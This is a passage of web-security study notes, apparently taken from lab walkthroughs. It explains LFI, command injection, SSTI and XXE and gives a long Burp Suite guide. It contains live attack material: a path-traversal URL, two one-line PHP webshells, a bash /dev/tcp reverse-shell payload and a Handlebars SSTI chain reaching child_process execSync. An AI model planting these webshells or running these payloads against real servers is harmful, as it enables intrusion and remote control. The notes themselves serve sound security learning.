The consequence of the attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data. Depending on the application's functionality, this might include CSRF tokens, email messages, or financial data.
Any attribute that makes an external request can be used for dangling markup. 


## Cross-Site Request Forgery (CSRF)
Cross-Site Request Forgery (CSRF) is another class of vulnerability focused on poor session controls and session management.


File Inclusion Vulnerability
Dynamic websites include HTML pages on the fly using information from the HTTP request to include GET
and POST parameters, cookies, and other variables. It is common for a page to "include" another page
based on some of these parameters.
LFI or Local File Inclusion Local file inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploitation of vulnerable inclusion procedures implemented in an application. This occurs when an attacker is able to get a website to include a file that was notintended to be an option for this application. A common example is when an application uses the path to a file as input. If the application treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code execution as well.
RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote(upload a file through)
file on the host using protocols like HTTP, FTP etc.
We test the page parameter to see if we can include files on the target system in the server response. We
will test with some commonly known files that will have the same name across networks, Windows
domains, and systems which can be found here. One of the most common files that a penetration tester
might attempt to access on a Windows machine to verify LFI is the hosts file,
WINDOWS\System32\drivers\etc\hosts (this file aids in the local translation of host names to IP
addresses). The ../ string is used to traverse back a directory, one at a time. Thus multiple ../ strings are
included in the URL so that the file handler on the server traverses back to the base directory i.e. C:\ .
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts

## Insecure Direct Object Reference (IDOR)
IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.

## Insecure Deserialization
"Insecure Deserialization is a vulnerability which occurs when untrusted data is used to abuse the logic of an application."
This definition is still quite broad to say the least. Simply, insecure deserialization is replacing data processed by an application with malicious code, allowing anything from DoS (Denial of Service) to RCE (Remote Code Execution) that the attacker can use to gain a foothold in a pentesting scenario.
Specifically, this malicious code leverages the legitimate serialization and deserialization process used by web applications. Serialisation is the process of converting objects used in programming into simpler, compatible formatting for transmitting between systems or networks for further processing or storage. Alternatively, deserialisation is the reverse of this, converting serialised information into their complex form - an object that the application will understand. Insecure deserialization occurs when data from an untrusted party (i.e., a hacker) gets executed because there is no filtering or input validation; the system assumes that the data is trustworthy and will execute it no holds barred.

## Zero-Day Vulnerabilities
A "zero-day" (also called "0-day") vulnerability is a newly discovered software bug that a developer was not aware of before the software was released. Therefore, after it is discovered, the developer has "zero" days to patch it before it can be exploited. When a "zero-day attack" occurs, the vulnerability quickly becomes known and is patched by the developer.

## Distributed Denial of Service (DDoS)
DDoS stands for Distributed Denial of Service. A DDoS attack is when an attacker attempts to make a resource, such as a website's various servers, go offline by overwhelming it with web traffic. How does an attacker do this? They make requests to a resource with a large number of computers, overwhelming the resource and making it run slower and slower until eventually, it goes offline entirely.
Because an attacker must use a large number of computers, the attack is "distributed" across multiple devices. The goal is to knock the resource offline so that it "denies service"; hence the name "distributed denial of service". This traffic comes from botnets. Botnets are "robot networks" made up of computers infected by malware. These botnets can be made up of millions of bots, and can even include IoT devices. A single attacker can spread malware to many devices and then use all of those devices in concert to act together, oftentimes without the victims ever knowing that their devices are infected.


## Command Injection 
This is the abuse of an application's behaviour to execute commands on the operating system, using the same privileges that the application on a device is running with. A command injection vulnerability is also known as a "Remote Code Execution" (RCE) because an attacker can trick the application into executing a series of payloads that they provide, without direct access to the machine itself (i.e. an interactive shell). The webserver will process this code and execute it under the privileges and access controls of the user who is running that application.  

Command injection is also often known as “Remote Code Execution” (RCE) because of the ability to remotely execute code within an application. These vulnerabilities are often the most lucrative to an attacker because it means that the attacker can directly interact with the vulnerable system. For example, an attacker may read system or user files, data, and things of that nature. This attack differs from Code Injection, in that code injection allows the attacker to add his own code that is then executed by the application. In Command Injection, the attacker extends the default functionality of the application, which execute system commands, without the necessity of injecting code.
https://github.com/payloadbox/command-injection-payload-list

In computer security, arbitrary code execution (ACE) is an attacker's ability to execute
arbitrary commands or code on a target machine or in a target process. [..] A program
designed to exploit such a vulnerability is called an arbitrary code execution exploit.
The ability to trigger arbitrary code execution over a network (primarily via a wide-area
network such as the Internet) is often called remote code execution (RCE)
Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to obtain an interactive shell session on the target machine and continue their attack.

## Remote Code Execution (as the name suggests) 
This would allow us to execute code arbitrarily on the web server. Whilst this is likely to be as a low-privileged WEB USER ACCOUNT {such as www-data on Linux servers -> we can't achieve many things as the role has restricted access on the system, www-data is a default user on systems where web servers are installed and usually has minimal privileges. Since the website might be making use of PHP and SQL we can enumerate further the web directory for potential disclosures or misconfigurations. After some search we can find some interesting php files under /var/www/html/cdn-cgi/login directory}, it's still an extremely serious vulnerability. Remote code execution through a web application tends to be a result of uploading a program written in the same language as the back-end of the website (or another language which the server understands and will execute). There are two basic ways to achieve RCE on a webserver: Webshells, and Reverse shells. Realistically a fully featured reverse shell is the ideal goal for an attacker; however, a webshell may be the only option available (for example, if a file length limit has been imposed on uploads). Note that when using webshells, it's usually easier to view the output by looking at the source code of the page. This drastically improves the formatting of the output. 
<? php echo system($_GET["cmd"]); ?> This retrieves the command strictly from the query parameters of a GET request.
<?php echo system($_REQUEST['cmd']);?> This can retrieve the command from both the query parameters & the body of the request. It works with GET/POST/COOKIE data.
This code takes a GET parameter and executes it as a system command. It then echoes the output out to the screen.
We are making use of the $_REQUEST method to fetch the cmd parameter because it works for fetching both URL parameters in GET requests and HTTP request body parameters in case of POST requests. Furthermore, we also use a POST request later in the walkthrough, thus using the $_REQUEST method is the most effective way to fetch the cmd parameter in this context. If the current request is an HTTP GET request and we can attempt to use it to send a command that will grant us a reverse shell on the system, however, it is likely that one might encounter errors due to the presence of special characters in the URL (even after URL encoding them). Instead, let us convert this GET request to a POST request and send the reverse shell command as an HTTP POST parameter. Right-click inside the Request body box, and click on the "Change request method" in order to convert this HTTP GET request to an HTTP POST request
In the repeater tab, we can alter the request and set the following reverse shell payload { /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP_ADDRESS/LISTENING_PORT 0>&1' }as a value for the cmd parameter. This reverse shell payload will make the remote host connect back to us with an interactive bash shell on the specified port that we are listening on. It's important to URL encode the payload, or else the server will not interpret the command correctly. For example, in the POST body, the & character is used to signal the start of a new parameter. But we have two & characters in our string that are both a part of the cmd parameter. By encoding them, this tells the server
to treat this entire string as part of cmd 

## Directory Traversal
Directory traversal (also known as file path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application. This might include application code and data, credentials for back-end systems, and sensitive operating system files. In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.


## Server Side Template Injection (SSTI).
What is an SSTI? Server-side template injection is a vulnerability where the attacker injects malicious input into a template in order to execute commands on the server.
To put it plainly an SSTI is an exploitation technique where the attacker injects native (to the Template Engine) code into a web page. The code is then run via the Template Engine and the attacker gains code execution on the affected server.
What is a Template Engine? 
Template Engines are used to display dynamically generated content on a web page. They replace the variables inside a template file with actual values and display these values to the client (i.e. a user opening a page through their browser). For instance, if a developer needs to create a user profile page, which will contain Usernames, Emails, Birthdays and various other content, that is very hard if not impossible to achieve for multiple different users with a static HTML page. The template engine would be used here, along a static "template" that contains the basic structure of the profile page, which would then manually fill in the user information and display it to the user. Template Engines, like all software, are prone to vulnerabilities. The vulnerability that we will be focusing on today is called Server-side template injection.
The response shows an error that states require is not defined . Taking a look at the payload we notice the following code. {{this.push "return require('child_process').exec('whoami');"}}
This is likely the part of the payload that is erroring out. require is a keyword in Javascript and more specifically Node.js that is used to load code from other modules or files. The above code is attempting to load the Child Process module into memory and use it to execute system commands (in this case whoami ). Template Engines are often Sandboxed, meaning their code runs in a restricted code space so that in the event of malicious code being run, it will be very hard to load modules that can run system commands. If we cannot directly use require to load such modules, we will have to find a different way require is in fact not in the global scope and therefore in specific cases it might not be accessible. Taking a closer look at the documentation we see that there is a process object available. The documentation states that this object provides information about, and control over, the current Node.js process. We might be able to use this object to load a module.  {{this.push "return process;"}} Taking a closer look at the documentation of the process object, we see that it has a .mainModule property details the usage of this property. Specifically, it mentions that this property returns an object that contains the reference of main module. Since handlebars is running in a sandboxed environment, we might be able to use the mainModule property to directly load the main function and since the main function is most probably not sandboxed, load require from there. Let's modify our payload once more to see if mainModule is accessible. {{this.push "return process.mainModule;"}}
Now lets attempt to call require and load a module. We can load the child_process module as it is available on default Node.js installations and can be used to execute system commands {{this.push "return process.mainModule.require('child_process');"}}
{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}

## Extensible Markup Language (XML) is a markup language that defines a set of rules for encoding documents in a format that is both human-
readable and machine-readable." What about XML entities? They "are a way of representing an item of data within an XML document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities &lt; and &gt; represent the characters < and > . These are metacharacters used to denote XML tags, and so must generally be represented using. their entities when they appear within data. You can read more about this subject on The vulnerability comes into play when a misconfiguration exists in the XML parser on the server'scside. From OWASP's definition of XXE Processing:
"An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weaklycconfigured XML parser. This attack may lead to the disclosure of confidential data, denial of service,cserver side request forgery, port scanning from the perspective of the machine where the parser isclocated, and other system impacts. The XML 1.0 standard defines the structure of an XML document. The standard defines a concept called
an entity, which is a storage unit of some type. There are a few different types of entities, external
general/parameter parsed entity often shortened to external entity, that can access local or remote
content via a declared system identifier. The system identifier is assumed to be a URI that can be
dereferenced (accessed) by the XML processor when processing the entity. The XML processor then
replaces occurrences of the named external entity with the contents dereferenced by the system
identifier. If the system identifier contains tainted data and the XML processor dereferences this tainted
data, the XML processor may disclose confidential information normally not accessible by the
application. Similar attack vectors apply the usage of external DTDs, external stylesheets, external
schemas, etc. which, when included, allow similar external resource inclusion style attacks.
Attacks can include disclosing local files, which may contain sensitive data such as passwords or private
user data, using file: schemes or relative paths in the system identifier. Since the attack occurs relative to
the application processing the XML document, an attacker may use this trusted application to pivot to
other internal systems, possibly disclosing other internal content via http(s) requests or launching a CSRF
attack to any unprotected internal services. In some situations, an XML processor library that is
vulnerable to client-side memory corruption issues may be exploited by dereferencing a malicious URI,
possibly allowing arbitrary code execution under the application account. Other attacks can access local
resources that may not stop returning data, possibly impacting application availability if too many
threads or processes are not released.

## Web-Enumeration
 BURP SUITE is a framework written in Java that aims to provide a one-stop-shop for web application penetration testing. In many ways, this goal is achieved as Burp is very much the industry standard tool for hands-on web app security assessments. Burp Suite is also very commonly used when assessing mobile applications, as the same features which make it so attractive for web app testing translate almost perfectly into testing the APIs (Application Programming Interfaces) powering most mobile apps.
At the simplest level, Burp can capture and manipulate all of the traffic between an attacker and a webserver: this is the core of the framework. After capturing requests, we can choose to send them to various other parts of the Burp Suite framework. This ability to intercept, view, and modify web requests prior to them being sent to the target server (or, in some cases, the responses before they are received by our browser), makes Burp Suite perfect for any kind of manual web app testing. 
Global Settings: These settings affect the entire Burp Suite installation and are applied every time you start the application. They provide a baseline configuration for your Burp Suite environment.
Project Settings: These settings are specific to the current project and apply only during the session. However, please note that Burp Suite Community Edition does not support saving projects, so any project-specific options will be lost when you close Burp.. 

Shortcut	Tab
Ctrl + Shift + D	Dashboard
Ctrl + Shift + T	Target tab
Ctrl + Shift + P	Proxy tab
Ctrl + Shift + I	Intruder tab
Ctrl + Shift + R	Repeater tab

The Burp Dashboard is divided into four quadrants, as labelled in counter-clockwise order starting from the top left:
Tasks: The Tasks menu allows you to define background tasks that Burp Suite will perform while you use the application. In Burp Suite Community, the default “Live Passive Crawl” task, which automatically logs the pages visited, is sufficient for our purposes in this module. Burp Suite Professional offers additional features like on-demand scans.
Event log: The Event log provides information about the actions performed by Burp Suite, such as starting the proxy, as well as details about connections made through Burp.
Issue Activity: This section is specific to Burp Suite Professional. It displays the vulnerabilities identified by the automated scanner, ranked by severity and filterable based on the certainty of the vulnerability.
Advisory: The Advisory section provides more detailed information about the identified vulnerabilities, including references and suggested remediations. This information can be exported into a report. In Burp Suite Community, this section may not show any vulnerabilities.
Remember the following:
When the proxy configuration is active, and the intercept is switched on in Burp Suite, your browser will hang whenever you make a request.
Be cautious not to leave the intercept switched on unintentionally, as it can prevent your browser from making any requests.
Right-clicking on a request in Burp Suite allows you to perform various actions, such as forwarding, dropping, sending to other tools, or selecting options from the right-click menu.
Note: If we are running BURP_SUITE on Linux as the root user, Burp Suite is unable to create a sandbox environment to start the Burp Browser in, causing it to throw an error and die: The Burp Browser Error indicating that our current configuration can't run without a sandbox
There are two simple solutions to this:
    The smart option: We could create a new user and run Burp Suite under a low privilege account.
    The easy option: We could go to Project options -> Misc -> Embedded Browser and check the  Allow the embedded browser to run without a sandbox option.
Whilst Burp Community has a relatively limited feature-set compared to the Professional edition, it still has many superb tools/modules available. These include:

###  Proxy:
 The most well-known aspect of Burp Suite, the Burp Proxy allows us to intercept and modify requests/responses when interacting with web applications. The Burp Proxy is a fundamental and crucial tool within Burp Suite. It enables the capture of requests and responses between the user and the target web server. This intercepted traffic can be manipulated, sent to other tools for further processing, or explicitly allowed to continue to its destination. Key Points to Understand About the Burp Proxy
- Intercepting Requests: When requests are made through the Burp Proxy, they are intercepted and held back from reaching the target server. The requests appear in the Proxy tab, allowing for further actions such as forwarding, dropping, editing, or sending them to other Burp modules. To disable the intercept and allow requests to pass through the proxy without interruption, click the Intercept is on button.
- Taking Control: The ability to intercept requests empowers testers to gain complete control over web traffic, making it invaluable for testing web applications.
- Capture and Logging: Burp Suite captures and logs requests made through the proxy by default, even when the interception is turned off. This logging functionality can be helpful for later analysis and review of prior requests.
- WebSocket Support: Burp Suite also captures and logs WebSocket communication, providing additional assistance when analysing web applications.
- Logs and History: The captured requests can be viewed in the HTTP history and WebSockets history sub-tabs, allowing for retrospective analysis and sending the requests to other Burp modules as needed

Some Notable Features in the Proxy Settings
- Response Interception: By default, the proxy does not intercept server responses unless explicitly requested on a per-request basis. The "Intercept responses based on the following rules" checkbox, along with the defined rules, allows for a more flexible response interception.
- Match and Replace: The "Match and Replace" section in the Proxy settings enables the use of REGULAR EXPRESSIONS (regex) to modify incoming and outgoing requests. This feature allows for dynamic changes, such as modifying the user agent or manipulating cookies

The Target tab in Burp Suite provides more than just control over the scope of our testing. It consists of three sub-tabs:
- Site map: This sub-tab allows us to map out the web applications we are targeting in a tree structure. Every page that we visit while the proxy is active will be displayed on the site map. This feature enables us to automatically generate a site map by simply browsing the web application. In Burp Suite Professional, we can also use the site map to perform automated crawling of the target, exploring links between pages and mapping out as much of the site as possible. Even with Burp Suite Community, we can still utilize the site map to accumulate data during our initial enumeration steps. It is particularly useful for mapping out APIs, as any API endpoints accessed by the web application will be captured in the site map.
- Issue definitions: Although Burp Community does not include the full vulnerability scanning functionality available in Burp Suite Professional, we still have access to a list of all the vulnerabilities that the scanner looks for. The Issue definitions section provides an extensive list of web vulnerabilities, complete with descriptions and references. This resource can be valuable for referencing vulnerabilities in reports or assisting in describing a particular vulnerability that may have been identified during manual testing.
- Scope settings: This setting allows us to control the target scope in Burp Suite. It enables us to include or exclude specific domains/IPs to define the scope of our testing. By managing the scope, we can focus on the web applications we are specifically targeting and avoid capturing unnecessary traffic.


### Repeater: 
The second most well-known Burp feature -- Repeater -- allows us to capture, modify, then resend the same request numerous times. Burp Suite Repeater allows us to craft and/or relay intercepted requests to a target at will. In layman's terms, it means we can take a request captured in the Proxy, edit it, and send the same request repeatedly as many times as we wish.This feature can be absolutely invaluable, especially when we need to craft a payload through trial and error (e.g. in an SQLi -- Structured Query Language Injection) or when testing the functionality of an endpoint for flaws.

### Intruder: 
Although harshly rate-limited in Burp Community, Burp Suite's Intruder module is a powerful tool that allows for automated and customisable attacks. It provides the ability to modify specific parts of a request and perform repetitive tests with variations of input data. Intruder is particularly useful for tasks like fuzzing and brute-forcing, where different values need to be tested against a target. There are four sub-tabs within Intruder:
- Positions: This tab allows us to select an attack type (which we will cover in a future task) and configure where we want to insert our payloads in the request template.
- Payloads: Here we can select values to insert into the positions defined in the Positions tab. We have various payload options, such as loading items from a wordlist. The way these payloads are inserted into the template depends on the attack type chosen in the Positions tab. The Payloads tab also enables us to modify Intruder's behavior regarding payloads, such as defining pre-processing rules for each payload (e.g., adding a prefix or suffix, performing match and replace, or skipping payloads based on a defined regex). 
- Payload Sets: This section allows us to choose the position for which we want to configure a payload set and select the type of payload we want to use. When using attack types that allow only a single payload set (Sniper or Battering Ram), the "Payload Set" dropdown will have only one option, regardless of the number of defined positions. If we use attack types that require multiple payload sets (Pitchfork or Cluster Bomb), there will be one item in the dropdown for each position. Note: When assigning numbers in the "Payload Set" dropdown for multiple positions, follow a top-to-bottom, left-to-right order. For example, with two positions (username=§pentester§&password=§Expl01ted§), the first item in the payload set dropdown would refer to the username field, and the second item would refer to the password field.
- Payload settings: This section provides options specific to the selected payload type for the current payload set. For example, when using the "Simple list" payload type, we can manually add or remove payloads to/from the set using the Add text box, Paste lines, or Load payloads from a file. The Remove button removes the currently selected line, and the Clear button clears the entire list. Be cautious with loading huge lists, as it may cause Burp to crash. Each payload type will have its own set of options and functionality. Explore the options available to understand the range of possibilities. 
- Payload Processing: In this section, we can define rules to be applied to each payload in the set before it is sent to the target. For example, we can capitalize every word, skip payloads that match a regex pattern, or apply other transformations or filtering. While you may not use this section frequently, it can be highly valuable when specific payload processing is required for your attack.
- Payload Encoding: The section allows us to customize the encoding options for our payloads. By default, Burp Suite applies URL encoding to ensure the safe transmission of payloads. However, there may be cases where we want to adjust the encoding behavior. We can override the default URL encoding options by modifying the list of characters to be encoded or unchecking the "URL-encode these characters" checkbox.

- Resource Pool: This tab is not particularly useful in the Burp Community Edition. It allows for resource allocation among various automated tasks in Burp Professional. Without access to these automated tasks, this tab is of limited importance.
- Settings: This tab allows us to configure attack behavior. It primarily deals with how Burp handles results and the attack itself. For instance, we can flag requests containing specific text or define Burp's response to redirect (3xx) responses.

### Fuzzing: 
This is when we take a set of data and apply it to a parameter to test functionality or to see if something exists. For example, we may choose to "fuzz for endpoints" in a web application; this would involve taking each word in a wordlist and adding it to the end of a request to see how the web server responds (e.g. http://IP_Address/WORD_GOES_HERE).
There are four attack types available: To clarify, the §§ is not two sperate inputs but rather Burp's implementation of quotations e.g. "". When using Burp Suite Intruder to perform an attack, the first step is to examine the positions within the request where we want to insert our payloads. These positions inform Intruder about the locations where our payloads will be introduced. Notice that Burp Suite automatically attempts to identify the most probable positions where payloads can be inserted. These positions are highlighted in green and enclosed by section marks (§). On the right-hand side of the interface, we find the following buttons: Add §, Clear §, and Auto §:
    The Add § button allows us to define new positions manually by highlighting them within the request editor and then clicking the button. The Clear § button removes all defined positions, providing a blank canvas where we can define our own positions. The Auto § button automatically attempts to identify the most likely positions based on the request. This feature is helpful if we previously cleared the default positions and want them back.
    Sniper - Intruder will take each payload in a payload set and put it into each defined position in turn. Sniper is good for attacks where we are only attacking a single parameter. The Sniper attack type is beneficial when we want to perform tests with single-position attacks, utilizing different payloads for each position. It allows for precise testing and analysis of different payload variations.
The total number of requests made by Intruder Sniper can be calculated as requests = numberOfWords * numberOfPositions.
    Battering ram - Like Sniper, Battering ram takes one set of payloads too(e.g. one wordlist), it differs from Sniper in that it places the same payload in every position simultaneously, rather than substituting each payload into each position in turn. Each item in our list of payloads gets put into every position for each request. True to the name, Battering ram just throws payloads at the target to see what sticks. This attack type is useful when testing for race conditions or when payloads need to be sent concurrently. Also useful when we want to test the same payload against multiple positions at once without the need for sequential substitution.
    Pitchfork - similar to having multiple Sniper attacks running simultaneously. The Pitchfork attack type enables the simultaneous testing of multiple positions with different payloads. It allows the tester to define multiple payload sets, each associated with a specific position in the request. Pitchfork attacks are effective when there are distinct parameters that need separate testing. It may help to think of Pitchfork as being like having numerous Snipers running simultaneously. Where Sniper uses one payload set (which it uses on every position simultaneously), Pitchfork uses one payload set per position (up to a maximum of 20 positions) and iterates through them all simultaneously. Pitchfork takes the first item from each list and substitutes them into the request, one per position. It then repeats this process for the next request by taking the second item from each list and substituting it into the template. Intruder continues this iteration until one or all of the lists run out of items. It's important to note that Intruder stops testing as soon as one of the lists is complete. Therefore, in Pitchfork attacks, it is ideal for the payload sets to have the same length. If the lengths of the payload sets differ, Intruder will only make requests until the shorter list is exhausted, and the remaining items in the longer list will not be tested.
The Pitchfork attack type is especially useful when conducting credential-stuffing attacks or when multiple positions require separate payload sets. It allows for simultaneous testing of multiple positions with different payloads.
    Cluster bomb - Like Pitchfork, Cluster bomb allows us to choose multiple payload sets: one per position, up to a maximum of 20; however, whilst Pitchfork iterates through each payload set simultaneously, Cluster bomb iterates through each payload set individually, making sure that every possible combination of payloads is tested. Cluster bomb attack type iterates through every combination of the provided payload sets. It tests every possibility by substituting each value from each payload set into the corresponding position in the request. Cluster bomb attacks can generate a significant amount of traffic as it tests every combination. The number of requests made by a Cluster bomb attack can be calculated by multiplying the number of lines in each payload set together. It's important to be cautious when using this attack type, especially when dealing with large payload sets. Additionally, when using Burp Community and its Intruder rate-limiting, the execution of a Cluster bomb attack with a moderately sized payload set can take a significantly longer time.
The Cluster bomb attack type is particularly useful for credential brute-forcing scenarios where the mapping between usernames and passwords is unknown

The spotlight will be on the Decoder, Comparer, Sequencer, and Organizer tools. They facilitate operations with encoded text, enable comparison of data sets, allow the analysis of randomness within captured tokens, and help you store and annotate copies of HTTP messages that you may want to revisit later.

### Decoder: 
As the name suggests this module allows us to manipulate data, we can decode information that we capture during an attack, but we can also encode data of our own, ready to be sent to the target. Decoder also allows us to create HASH_SUMS of data, as well as providing a Smart Decode feature which attempts to decode provided data recursively until it is back to being plaintext still provides a valuable service when transforming data -- either in terms of decoding captured information, or encoding a payload prior to sending it to the target. Whilst there are other services available to do the same job, doing this directly within Burp Suite can be very efficient.
The interface lays out a multitude of options.
This box serves as the workspace for entering or pasting data that requires encoding or decoding. Consistent with other modules of Burp Suite, data can be moved to this area from different parts of the framework via the Send to Decoder option upon right-clicking.
At the top of the list on the right, there's an option to treat the input as either text or hexadecimal byte values.
As we move down the list, dropdown menus are present to encode, decode, or hash the input.
The Smart Decode feature, located at the end, attempts to auto-decode the input. Upon entering data into the input field, the interface replicates itself to present the output of our operation. We can then choose to apply further transformations using the same options:
Plain: This refers to the raw text before any transformations are applied.
URL: URL encoding is utilized to ensure the safe transfer of data in the URL of a web request. It involves substituting characters for their ASCII character code in hexadecimal format, preceded by a percentage symbol (%). This method is vital for any type of web application testing.
For instance, encoding the forward-slash character (/), whose ASCII character code is 47, converts it to 2F in hexadecimal, thus becoming %2F in URL encoding. The Decoder can be used to verify this by typing a forward slash in the input box, then selectingEncode as -> URL :
HTML: HTML Entities encoding replaces special characters with an ampersand (&), followed by either a hexadecimal number or a reference to the character being escaped, and ending with a semicolon (;). This method ensures the safe rendering of special characters in HTML and helps prevent attacks such as XSS. The HTML option in Decoder allows any character to be encoded into its HTML escaped format or decode captured HTML entities. For instance, to decode a previously discussed quotation mark, input the encoded version and choose Decode as -> HTML:
Base64: Base64, a commonly used encoding method, converts any data into an ASCII-compatible format. The under-the-hood functioning isn't crucial at this stage; however, interested individuals can find the underlying mathematics here.
ASCII Hex: This option transitions data between ASCII and hexadecimal representations. For instance, the word "ASCII" can be converted into the hexadecimal number "4153434949". Each character is converted from its numeric ASCII representation into hexadecimal.
Hex, Octal, and Binary: These encoding methods apply solely to numeric inputs, converting between decimal, hexadecimal, octal (base eight), and binary representations.
Gzip: Gzip compresses data, reducing file and page sizes before browser transmission. Faster load times are highly desirable for developers looking to enhance their SEO score and avoid user inconvenience. Decoder facilitates the manual encoding and decoding of gzip data, although it often isn't valid ASCII/Unicode.
In combination, these methods grant us substantial control over the data we are encoding or decoding.
Each encoding/decoding method is color-coded, enabling swift identification of the applied transformation.
Hex Format: While inputting data in ASCII format is beneficial, there are times when byte-by-byte input editing is necessary. This is where "Hex View" proves useful, selectable above the decoding options:
This feature enables us to view and alter our data in hexadecimal byte format, a vital tool when working with binary files or other non-ASCII data.
Smart Decode
Lastly, we have the Smart decode option. This feature tries to auto-decode encoded text. For instance, &#x42;&#x75;&#x72;&#x70;&#x20;&#x53;&#x75;&#x69;&#x74;&#x65; is automatically recognized as HTML encoded and is accordingly decoded: While not perfect, this feature can be a quick solution for decoding unknown data chunks.
Note: A Poison Null Byte is actually a NULL terminator. By placing a NULL character in the string at a certain byte, the string will tell the server to terminate at that point, nulling the rest of the string. A Poison Null Byte looks like this: %00, we will need to encode this into a url encoded format.
The Poison Null Byte will now look like this: %2500
https://stackabuse.com/encoding-and-decoding-base64-strings-in-python/

### Comparer: 
As the name suggests, Comparer allows us to compare two pieces of data at either word or byte level. Again, this is not something that is unique to Burp Suite, but being able to send (potentially very large) pieces of data directly into a comparison tool with a single keyboard shortcut can speed things up considerably. 
    The compared data occupies most of the window; it can be viewed in either text or hex format. The initial format depends on whether we chose to compare by words or bytes in the previous window, but this can be overridden by using the buttons above the comparison boxes.
    The comparison key is at the bottom left, showing which colors represent modified, deleted, and added data between the two datasets.
    The Sync views checkbox is at the bottom right of the window. When selected, it ensures that both sets of data will sync formats. In other words, if you change one of them into Hex view, the other will adjust to match.


### Sequencer: 
We usually use Sequencer when assessing the randomness of tokens such as session cookie values or other supposedly random generated data. If the algorithm is not generating secure random values, then this could open up some devastating avenues for attack. For example, we may wish to analyse the randomness of a session cookie or a Cross-Site Request Forgery (CSRF) token protecting a form submission. If it turns out that these tokens are not generated securely, then we can (in theory) predict the values of upcoming tokens. Just imagine the implications of this if the token in question is used for password resets...
    Live Capture: This is the more common method and is the default sub-tab for Sequencer. Live capture lets us pass a request that will generate a token to Sequencer for analysis. For instance, we might want to pass a POST request to a login endpoint to Sequencer, knowing that the server will respond with a cookie. With the request passed in, we can instruct Sequencer to start a live capture. It will then automatically make the same request thousands of times, storing the generated token samples for analysis. After collecting enough samples, we stop the Sequencer and allow it to analyze the captured tokens.
    Manual Load: This allows us to load a list of pre-generated token samples directly into Sequencer for analysis. Using Manual Load means we don't need to make thousands of requests to our target, which can be noisy and resource-intensive. However, it does require that we have a large list of pre-generated tokens.
It's important to note that we could have also chosen to Stop the capture. However, by opting to pause, we keep the option to resume the capture later if the report doesn't have enough samples to accurately calculate the token's entropy.
If we wished for periodic updates on the analysis, we could have also selected the "Auto analyze" checkbox. This option tells Burp to perform the entropy analysis after every 2000 requests, providing frequent updates that will become increasingly accurate as more samples are loaded into Sequencer.
At this point, it's also worth noting that we could choose to copy or save the captured tokens for further analysis at a later time.
Upon clicking the Analyze now button, Burp will analyze the token's entropy and generate a report.
The generated entropy analysis report is split into four primary sections. The first of these is the Summary of the results. The summary gives us the following:
- Overall result: This gives a broad assessment of the security of the token generation mechanism. In this case, the level of entropy indicates that the tokens are likely securely generated.
- Effective entropy: This measures the randomness of the tokens. The effective entropy of 117 bits is relatively high, indicating that the tokens are sufficiently random and, therefore, secure against prediction or brute force attacks.
- Reliability: The significance level of 1% implies that there is 99% confidence in the accuracy of the results. This level of confidence is quite high, providing assurance in the accuracy of the effective entropy estimation.
- Sample: This provides details about the token samples analyzed during the entropy testing process, including the number of tokens and their characteristics.
While the summary report often provides enough information to assess the security of the token generation process, it's important to remember that further investigation may be necessary in some cases. The character-level and bit-level analysis can provide more detailed insights into the randomness of the tokens, especially when the summary results raise potential concerns.
While the entropy report can provide a strong indicator of the security of the token generation mechanism, there needs to be more definitive proof. Other factors could also impact the security of the tokens, and the nature of probability and statistics means there's always a degree of uncertainty. That said, an effective entropy of 117 bits with a significance level of 1% suggests a robustly secure token generation process.

### Inspector 
This is entirely supplementary to the request and response fields of the Repeater window. If you understand how to read and edit HTTP requests, then you may find that you rarely use Inspector at all, Inspector is a supplementary feature to the Request and Response views in the Repeater module. It is also used to obtain a visually organized breakdown of requests and responses, as well as for experimenting to see how changes made using the higher-level Inspector affect the equivalent raw versions.
Inspector can be utilized both in the Proxy and Repeater module. In both instances, it is situated on the far-right side of the window, presenting a list of components within the request and response: Among these components, the sections pertaining to the request can typically be modified, enabling the addition, editing, and removal of items. For instance, in the Request Attributes section, we can alter elements related to the location, method, and protocol of the request. Other sections available for viewing and/or editing include:
Request Query Parameters: These refer to data sent to the server via the URL. For example, in a GET request like https://admin.tryhackme.com/?redirect=false, the query parameter redirect has a value of "false".
Request Body Parameters: Similar to query parameters, but specific to POST requests. Any data sent as part of a POST request will be displayed in this section, allowing us to modify the parameters before resending.
Request Cookies: This section contains a modifiable list of cookies sent with each request.
Request Headers: It enables us to view, access, and modify (including adding or removing) any headers sent with our requests. Editing these headers can be valuable when examining how a web server responds to unexpected headers.
Response Headers: This section displays the headers returned by the server in response to our request. It cannot be modified, as we have no control over the headers returned by the server. Note that this section becomes visible only after sending a request and receiving a response.

### The Organizer module of Burp Suite 
This is designed to help you store and annotate copies of HTTP requests that you may want to revisit later. This tool can be particularly useful for organizing your penetration testing workflow. Here are some of its key features:
You can store requests that you want to investigate later, save requests that you've already identified as interesting, or save requests that you want to add to a report later.
You can send HTTP requests to Burp Organizer from other Burp Modules such as Proxy or Repeater. You can do this by right-clicking the request and selecting Send to Organizer or using the default hotkey Ctrl + O. Each HTTP request that you send to Organizer is a read-only copy of the original request saved at the point you sent it to Organizer.
Requests are stored in a table, which contains columns such as the request index number, the time the request was made, workflow status, Burp tool that the request was sent from, HTTP method, server hostname, URL file path, URL query string, number of parameters in the request, HTTP status code of the response, length of the response in bytes, and any notes that you have made.
To view the request and response: Click on any Organizer item.
The request and response are both read-only. You can search within the request or response, select the request, and then use the search bar below the request. 

### The Burp Suite “Extender” module 
